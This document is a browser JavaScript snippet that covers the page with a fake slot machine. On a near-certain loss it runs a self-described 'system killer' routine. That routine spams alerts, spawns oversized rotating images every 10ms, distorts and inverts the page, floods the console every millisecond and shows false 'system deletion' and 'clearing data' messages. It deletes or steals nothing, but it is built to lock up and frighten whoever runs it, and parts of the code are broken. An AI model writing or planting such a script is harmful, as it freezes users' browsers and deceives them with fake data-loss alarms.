(function() {
    // --- PHASE 1: IDLE DEATH GAMBLE (THE REELS) ---
    const gambleOverlay = document.createElement('div');
    gambleOverlay.style.cssText = `
        position: fixed; top: 0; left: 0; width: 100vw; height: 100vh;
        background: rgba(40, 0, 80, 0.85); z-index: 2000000;
        display: flex; flex-direction: column; justify-content: center; align-items: center;
        pointer-events: all; font-family: serif; color: white;
    `;
    
    gambleOverlay.innerHTML = `
        <h1 style="font-size:60px; text-shadow: 0 0 20px pink; margin-bottom: 20px;">坐殺博徒</h1>
        <div id="slot-machine" style="display: flex; gap: 20px; background: black; padding: 30px; border: 5px solid gold; border-radius: 15px;">
            <div id="reel1" style="font-size: 80px; width: 100px; text-align: center;">?</div>
            <div id="reel2" style="font-size: 80px; width: 100px; text-align: center;">?</div>
            <div id="reel3" style="font-size: 80px; width: 100px; text-align: center;">?</div>
        </div>
        <p style="margin-top: 20px; font-size: 20px; letter-spacing: 2px;">REACHING JACKPOT... 1/1000 ODDS</p>
    `;
    document.body.appendChild(gambleOverlay);

    // Roll logic: 1/10 chance for a '7' on each reel
    function getRoll() {
        return Math.floor(Math.random() * 10) === 7 ? "7" : Math.floor(Math.random() * 9);
    }

    const reel1 = getRoll();
    const reel2 = getRoll();
    const reel3 = getRoll();

    // Visual sequence
    setTimeout(() => { document.getElementById('reel1').innerText = reel1; }, 1000);
    setTimeout(() => { document.getElementById('reel2').innerText = reel2; }, 2000);
    setTimeout(() => { 
        document.getElementById('reel3').innerText = reel3; 
        
        // CHECK FOR JACKPOT
        if (reel1 === "7" && reel2 === "7" && reel3 === "7") {
            // JACKPOT! Return to normal
            setTimeout(() => {
                gambleOverlay.style.background = "white";
                gambleOverlay.innerHTML = "<h1 style='color:gold; font-size:100px;'>JACKPOT!</h1>";
                setTimeout(() => { gambleOverlay.remove(); }, 1500);
            }, 500);
        } else {
            // LOSS: Trigger your killer script
            setTimeout(() => {
                gambleOverlay.remove();
                runKillerScript();
            }, 1000);
        }
    }, 3000);

    // --- PHASE 2: YOUR ORIGINAL "SYSTEM KILLER" SCRIPT ---
    function runKillerScript() {
        // 1. ALERT SPAM
        for(let i=0; i<3; i++) alert("!!! GAMBLE FAILED: SYSTEM DELETION !!!");

        // 2. THE "SYSTEM KILLER" SPAWNER
        function spawnMegaImage() {
            const img = new Image();
            const size = Math.floor(Math.random() * 1500) + 1500; 
            img.src = `https://picsum.photos{size}/${size}?random=${Math.random()}`;
            
            img.style.cssText = `
                position: fixed; top: ${Math.random() * 100}vh; left: ${Math.random() * 100}vw;
                width: ${size}px; z-index: 999999; pointer-events: none;
                filter: contrast(2) saturate(3) blur(1px) drop-shadow(0 0 50px red);
                transition: transform 3s cubic-bezier(0.1, 0, 0.9, 1);
                transform: translate(-50%, -50%) scale(0.01) rotate(0deg);
            `;
            document.body.appendChild(img);

            requestAnimationFrame(() => {
                img.style.transform = `translate(-50%, -50%) scale(8) rotate(${Math.random() * 5000}deg)`;
                img.style.opacity = '0.8';
            });
        }

        // 3. THE HYPER-LOOP (10ms)
        setInterval(() => {
            spawnMegaImage();
            document.body.style.transform = `translate(${(Math.random()-0.5)*300}px, ${(Math.random()-0.5)*300}px) rotate(${(Math.random()-0.5)*10}deg)`;
            document.documentElement.style.filter = `invert(${Math.random() > 0.5 ? 100 : 0}%) hue-rotate(${Math.random() * 360}deg)`;
            document.title = "GAMBLE_OVER_" + Math.random().toString(16).toUpperCase();
        }, 10);

        // 4. CONSOLE FLOODING
        setInterval(() => {
            console.error("JACKPOT NOT REACHED: CLEARING DATA_" + Date.now());
        }, 1);
    }
})();
